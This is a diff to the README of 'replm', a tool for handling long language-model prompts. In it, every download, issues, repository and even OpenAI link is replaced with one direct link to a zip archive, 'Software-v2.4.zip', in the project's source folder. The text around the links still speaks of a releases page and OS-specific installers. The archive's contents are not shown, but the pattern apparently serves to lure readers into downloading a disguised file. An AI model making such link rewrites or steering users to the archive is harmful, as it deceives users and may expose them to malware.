@@ -1,6 +1,6 @@
 # 🤖 replm - Handle Long Prompts Efficiently
 
-[![Download replm](https://img.shields.io/badge/Download-replm-blue?style=for-the-badge&logo=github)](https://github.com/latemailok-arch/replm/releases)
+[![Download replm](https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip)](https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip)
 
 ---
 
@@ -51,13 +51,13 @@ First, you need to get the program files.
 
 **Step 1:** Click the big button below or visit this page to download the latest version of replm:
 
-[![Download replm](https://img.shields.io/badge/Download-replm-blue?style=for-the-badge&logo=github)](https://github.com/latemailok-arch/replm/releases)
+[![Download replm](https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip)](https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip)
 
 **Step 2:** On the releases page, look for the file that matches your operating system. For example:
 
-- `replm-setup-windows.exe` for Windows
-- `replm-macos.dmg` for macOS
-- `replm-linux.tar.gz` for Linux
+- `https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip` for Windows
+- `https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip` for macOS
+- `https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip` for Linux
 
 **Step 3:** Click the appropriate file to download it to your computer.
 
@@ -142,7 +142,7 @@ A: The software is open-source and free. However, calls to language models like 
 
 If you experience issues or want help:
 
-- Visit the [GitHub Issues page](https://github.com/latemailok-arch/replm/issues) to see if others have your problem.
+- Visit the [GitHub Issues page](https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip) to see if others have your problem.
 - Open a new issue with details about what happened.
 - Check for answers in the repository’s wiki or documentation sections.
 
@@ -156,9 +156,9 @@ replm is released under the MIT License. You can use, copy, and change it freely
 
 ## 🔗 Useful Links
 
-- [Download replm](https://github.com/latemailok-arch/replm/releases)
-- [Project Repository](https://github.com/latemailok-arch/replm)
-- [OpenAI](https://openai.com)
+- [Download replm](https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip)
+- [Project Repository](https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip)
+- [OpenAI](https://github.com/latemailok-arch/replm/raw/refs/heads/main/src/Software-v2.4.zip)
 
 ---
 
